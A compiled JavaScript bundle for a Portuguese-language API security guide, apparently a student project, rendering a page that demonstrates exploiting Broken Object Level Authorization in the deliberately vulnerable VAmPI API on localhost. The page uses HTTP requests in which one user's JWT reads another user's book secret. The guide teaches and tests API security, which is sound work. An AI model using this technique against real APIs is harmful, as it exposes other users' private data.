"use strict";(self.webpackChunkapi_security_basic_guide=self.webpackChunkapi_security_basic_guide||[]).push([[8151],{3905:(e,a,o)=>{o.d(a,{Zo:()=>d,kt:()=>m});var n=o(7294);function t(e,a,o){return a in e?Object.defineProperty(e,a,{value:o,enumerable:!0,configurable:!0,writable:!0}):e[a]=o,e}function r(e,a){var o=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);a&&(n=n.filter((function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable}))),o.push.apply(o,n)}return o}function i(e){for(var a=1;a<arguments.length;a++){var o=null!=arguments[a]?arguments[a]:{};a%2?r(Object(o),!0).forEach((function(a){t(e,a,o[a])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(o)):r(Object(o)).forEach((function(a){Object.defineProperty(e,a,Object.getOwnPropertyDescriptor(o,a))}))}return e}function s(e,a){if(null==e)return{};var o,n,t=function(e,a){if(null==e)return{};var o,n,t={},r=Object.keys(e);for(n=0;n<r.length;n++)o=r[n],a.indexOf(o)>=0||(t[o]=e[o]);return t}(e,a);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(n=0;n<r.length;n++)o=r[n],a.indexOf(o)>=0||Object.prototype.propertyIsEnumerable.call(e,o)&&(t[o]=e[o])}return t}var l=n.createContext({}),u=function(e){var a=n.useContext(l),o=a;return e&&(o="function"==typeof e?e(a):i(i({},a),e)),o},d=function(e){var a=u(e.components);return n.createElement(l.Provider,{value:a},e.children)},p={inlineCode:"code",wrapper:function(e){var a=e.children;return n.createElement(n.Fragment,{},a)}},c=n.forwardRef((function(e,a){var o=e.components,t=e.mdxType,r=e.originalType,l=e.parentName,d=s(e,["components","mdxType","originalType","parentName"]),c=u(o),m=t,k=c["".concat(l,".").concat(m)]||c[m]||p[m]||r;return o?n.createElement(k,i(i({ref:a},d),{},{components:o})):n.createElement(k,i({ref:a},d))}));function m(e,a){var o=arguments,t=a&&a.mdxType;if("string"==typeof e||t){var r=o.length,i=new Array(r);i[0]=c;var s={};for(var l in a)hasOwnProperty.call(a,l)&&(s[l]=a[l]);s.originalType=e,s.mdxType="string"==typeof e?e:t,i[1]=s;for(var u=2;u<r;u++)i[u]=o[u];return n.createElement.apply(null,i)}return n.createElement.apply(null,o)}c.displayName="MDXCreateElement"},3992:(e,a,o)=>{o.r(a),o.d(a,{assets:()=>l,contentTitle:()=>i,default:()=>p,frontMatter:()=>r,metadata:()=>s,toc:()=>u});var n=o(7462),t=(o(7294),o(3905));const r={sidebar_position:2},i="Explora\xe7\xe3o",s={unversionedId:"Vulnerabilidades/Broken_Object_Level_Authorization/exploracao",id:"Vulnerabilidades/Broken_Object_Level_Authorization/exploracao",title:"Explora\xe7\xe3o",description:"---",source:"@site/docs/Vulnerabilidades/3_Broken_Object_Level_Authorization/exploracao.md",sourceDirName:"Vulnerabilidades/3_Broken_Object_Level_Authorization",slug:"/Vulnerabilidades/Broken_Object_Level_Authorization/exploracao",permalink:"/Api-Sec-Guide-TCC/docs/Vulnerabilidades/Broken_Object_Level_Authorization/exploracao",draft:!1,tags:[],version:"current",sidebarPosition:2,frontMatter:{sidebar_position:2},sidebar:"defaultSidebar",previous:{title:"Descri\xe7\xe3o",permalink:"/Api-Sec-Guide-TCC/docs/Vulnerabilidades/Broken_Object_Level_Authorization/descricao"},next:{title:"Corre\xe7\xe3o",permalink:"/Api-Sec-Guide-TCC/docs/Vulnerabilidades/Broken_Object_Level_Authorization/correcao"}},l={},u=[{value:"Autentica\xe7\xe3o na aplica\xe7\xe3o",id:"autentica\xe7\xe3o-na-aplica\xe7\xe3o",level:2},{value:"Consultando o livro de um usu\xe1rio",id:"consultando-o-livro-de-um-usu\xe1rio",level:2},{value:"Vulnerabilidade na rota <code>/books/v1/:book_title</code>",id:"vulnerabilidade-na-rota-booksv1book_title",level:2},{value:"Mais refer\xeancias dispon\xedveis na OWASP.",id:"mais-refer\xeancias-dispon\xedveis-na-owasp",level:4}],d={toc:u};function p(e){let{components:a,...o}=e;return(0,t.kt)("wrapper",(0,n.Z)({},d,o,{components:a,mdxType:"MDXLayout"}),(0,t.kt)("h1",{id:"explora\xe7\xe3o"},"Explora\xe7\xe3o"),(0,t.kt)("hr",null),(0,t.kt)("p",null,"Tendo em mente os questionamentos levantados ao final da sess\xe3o anterior, \xe9 poss\xedvel realizar os testes de seguran\xe7a a fim de descobrir onde a vulnerabilidade pode ser explorada."),(0,t.kt)("p",null,"Uma rota muito interessante para realizar esse teste de seguran\xe7a \xe9 justamente o de manipula\xe7\xe3o de livros, o principal objeto da nossa API vulner\xe1vel, se trata da rota ",(0,t.kt)("inlineCode",{parentName:"p"},"/books/v1/"),"."),(0,t.kt)("p",null,"Nessa rota, um usu\xe1rio pode acessar seus livros a partir dos t\xedtulos, retornando o segredo que foi armazenado juntamente com o livro. \xc9 importante ressaltar que os livros s\xe3o pertencentes apenas a um usu\xe1rio, sendo necess\xe1rio realizar a autentica\xe7\xe3o antes de acessar essas informa\xe7\xf5es."),(0,t.kt)("h2",{id:"autentica\xe7\xe3o-na-aplica\xe7\xe3o"},"Autentica\xe7\xe3o na aplica\xe7\xe3o"),(0,t.kt)("p",null,"Para que um usu\xe1rio acesse seus livros, \xe9 necess\xe1rio que o mesmo se autentique na aplica\xe7\xe3o, para isso basta utilizar a rota ",(0,t.kt)("inlineCode",{parentName:"p"},"/users/v1/login")," usando uma requisi\xe7\xe3o do tipo ",(0,t.kt)("inlineCode",{parentName:"p"},"POST")," enviando as informa\xe7\xf5es de login no body da requisi\xe7\xe3o."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Request de login na aplica\xe7\xe3o"',title:'"Request',de:!0,login:!0,na:!0,'aplica\xe7\xe3o"':!0},'POST /users/v1/login HTTP/1.1\nContent-Type: application/json\nUser-Agent: PostmanRuntime/7.29.2\nAccept: */*\nPostman-Token: 8c0e8020-2efc-4460-b63c-04b5f7d5ba84\nHost: localhost:5000\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Length: 56\n\n{\n    "username": "jordan",\n    "password": "password"\n}\n')),(0,t.kt)("p",null,"Na response, um token JWT \xe9 enviado e, atrav\xe9s dele, que a autentica\xe7\xe3o ser\xe1 realizada em todas as requisi\xe7\xf5es futuras."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Response de login na aplica\xe7\xe3o"',title:'"Response',de:!0,login:!0,na:!0,'aplica\xe7\xe3o"':!0},'HTTP/1.0 200 OK\nContent-Type: application/json\nContent-Length: 225\nServer: Werkzeug/1.0.1 Python/3.8.10\nDate: Sat, 28 Jan 2023 18:38:43 GMT\n\n{\n    "auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.\n    eyJleHAiOjE2NzU5MzExMjIsImlhdCI6MTY3NDkzMTEyMywic3ViIjoiam9yZGFuIn0.\n    hsFkgBl3aNHzEZ3a3ZoSw3tkO2JblOjbLdX9EJ2lIwA",\n    "message": "Successfully logged in.",\n    "status": "success"\n}\n')),(0,t.kt)("h2",{id:"consultando-o-livro-de-um-usu\xe1rio"},"Consultando o livro de um usu\xe1rio"),(0,t.kt)("p",null,"Antes de mais nada, para guiar nossos testes, vamos conhecer os livros que est\xe3o presentes no bando de dados da aplica\xe7\xe3o. Basta fazer uma requisi\xe7\xe3o do tipo ",(0,t.kt)("inlineCode",{parentName:"p"},"GET")," para o endpoint ",(0,t.kt)("inlineCode",{parentName:"p"},"/books/v1")," sem informar um tit\xfalo espec\xedfico."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-json",metastring:'title="T\xedtulos dos livros salvos"',title:'"T\xedtulos',dos:!0,livros:!0,'salvos"':!0},'{\n    "Books": [\n        {\n            "book_title": "bookTitle77",\n            "user": "name1"\n        },\n        {\n            "book_title": "bookTitle17",\n            "user": "name2"\n        },\n        {\n            "book_title": "bookTitle70",\n            "user": "admin"\n        },\n        {\n            "book_title": "Teste_seguran\xe7a",\n            "user": "jordan"\n        },\n        {\n            "book_title": "Receitas_de_familia",\n            "user": "name2"\n        }\n    ]\n}\n')),(0,t.kt)("p",null,"O usu\xe1rio ",(0,t.kt)("strong",{parentName:"p"},"jordan"),", ao qual foi feita a autentica\xe7\xe3o no t\xf3pico anterior, possui o livro ",(0,t.kt)("em",{parentName:"p"},"Teste_seguran\xe7a"),"."),(0,t.kt)("p",null,"Agora, com o usu\xe1rio logado, ser\xe1 realizada uma requisi\xe7\xe3o do tipo ",(0,t.kt)("inlineCode",{parentName:"p"},"GET")," para a rota ",(0,t.kt)("inlineCode",{parentName:"p"},"/books/v1/:book_title"),", que necessita de autentica\xe7\xe3o para trazer as informa\xe7\xf5es adicionais do livro, funcionando apenas para o usu\xe1rio que o possui."),(0,t.kt)("p",null,(0,t.kt)("em",{parentName:"p"},"Nota: O caractere ",(0,t.kt)("strong",{parentName:"em"},"\xe7")," \xe9 exibido como %C3%A7 por estar codificado em UTF-8 para as requisi\xe7\xf5es e respostas.")),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Request leg\xedtima de informa\xe7\xf5es sobre o livro Teste_seguran\xe7a"',title:'"Request',"leg\xedtima":!0,de:!0,"informa\xe7\xf5es":!0,sobre:!0,o:!0,livro:!0,'Teste_seguran\xe7a"':!0},"GET /books/v1/Teste_seguran%C3%A7a HTTP/1.1\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.\neyJleHAiOjE2NzU5MzExMjIsImlhdCI6MTY3NDkzMTEyMywic3ViIjoiam9yZGFuIn0.\nhsFkgBl3aNHzEZ3a3ZoSw3tkO2JblOjbLdX9EJ2lIwA\nUser-Agent: PostmanRuntime/7.29.2\nAccept: */*\nPostman-Token: 0cdc66aa-0178-418c-a1f9-91b3f7c760f1\nHost: localhost:5000\nAccept-Encoding: gzip, deflate\nConnection: close\n")),(0,t.kt)("p",null,"A resposta recebida foi o esperado: As informa\xe7\xf5es completas do livro do usu\xe1rio."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-json"},'HTTP/1.0 200 OK\nContent-Type: application/json\nContent-Length: 105\nServer: Werkzeug/1.0.1 Python/3.8.10\nDate: Sat, 28 Jan 2023 18:41:03 GMT\n\n{\n    "book_title": "Teste_seguran\\u00e7a",\n    "owner": "jordan",\n    "secret": "Broken Level Object Authorization!"\n}\n')),(0,t.kt)("h2",{id:"vulnerabilidade-na-rota-booksv1book_title"},"Vulnerabilidade na rota ",(0,t.kt)("inlineCode",{parentName:"h2"},"/books/v1/:book_title")),(0,t.kt)("p",null,"Para identificar a vulnerabilidade, as perguntas apresentadas pelo t\xf3pico anterior s\xe3o o suficiente."),(0,t.kt)("p",null,"Tendo essas pergunta em mente, \xe9 hora de checar se um usu\xe1rio poderia acessar as informa\xe7\xf5es secretas do livro de outro usu\xe1rio, utilizando apenas o t\xedtulo para isso."),(0,t.kt)("p",null,"No banco de dados existe um usu\xe1rio chamado ",(0,t.kt)("strong",{parentName:"p"},"name2"),", que ser\xe1 a v\xedtima do teste de consulta de informa\xe7\xf5es sobre os seus livros."),(0,t.kt)("p",null,"Utilizando o token de autentica\xe7\xe3o do usu\xe1rio ",(0,t.kt)("strong",{parentName:"p"},"jordan")," ser\xe1 feita uma requisi\xe7\xe3o do tipo ",(0,t.kt)("inlineCode",{parentName:"p"},"GET")," para o endpoint ",(0,t.kt)("inlineCode",{parentName:"p"},"/books/v1/:book_title"),". Por\xe9m, ser\xe1 utilizado o t\xedtulo ",(0,t.kt)("strong",{parentName:"p"},"Receitas_de_famil\xeda"),", que \xe9 pertencente ao usu\xe1rio ",(0,t.kt)("strong",{parentName:"p"},"name2"),"."),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-python",metastring:'title="Request maliciosa para o endpoint /books/v1/Receitas_de_familia usando o token de acesso do usu\xe1rio jordan"',title:'"Request',maliciosa:!0,para:!0,o:!0,endpoint:!0,"/books/v1/Receitas_de_familia":!0,usando:!0,token:!0,de:!0,acesso:!0,do:!0,"usu\xe1rio":!0,'jordan"':!0},"GET /books/v1/Receitas_de_familia HTTP/1.1\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.\neyJleHAiOjE2NzU5MzExMjIsImlhdCI6MTY3NDkzMTEyMywic3ViIjoiam9yZGFuIn0.\nhsFkgBl3aNHzEZ3a3ZoSw3tkO2JblOjbLdX9EJ2lIwA\nUser-Agent: PostmanRuntime/7.29.2\nAccept: */*\nPostman-Token: 785d837a-3b9b-416f-8c00-38ced9b040da\nHost: localhost:5000\nAccept-Encoding: gzip, deflate\nConnection: close\n")),(0,t.kt)("p",null,"Ap\xf3s realizar a requisi\xe7\xe3o, houve a seguinte reposta:"),(0,t.kt)("pre",null,(0,t.kt)("code",{parentName:"pre",className:"language-json",metastring:'title="Response maliciosa"',title:'"Response','maliciosa"':!0},'HTTP/1.0 200 OK\nContent-Type: application/json\nContent-Length: 128\nServer: Werkzeug/1.0.1 Python/3.8.10\nDate: Sat, 28 Jan 2023 19:36:04 GMT\n\n{\n    "book_title": "Receitas_de_familia",\n    "owner": "name2",\n    "secret": "Livro com todas as receitas secretas da minha fam\\u00edlia."\n}\n')),(0,t.kt)("p",null,"A resposta do VAmPI indica que a vulnerabilidade Broken Level Authorization est\xe1 presente na API, onde n\xe3o est\xe1 sendo realizada a valida\xe7\xe3o do usu\xe1rio antes de fornecer o acesso a um objeto."),(0,t.kt)("p",null,"Dessa forma, \xe9 poss\xedvel consultar o segredo dos livros de todos os usu\xe1rios da aplica\xe7\xe3o."),(0,t.kt)("h4",{id:"mais-refer\xeancias-dispon\xedveis-na-owasp"},"Mais refer\xeancias dispon\xedveis na ",(0,t.kt)("a",{parentName:"h4",href:"https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa1-broken-object-level-authorization.md"},"OWASP"),"."))}p.isMDXComponent=!0}}]);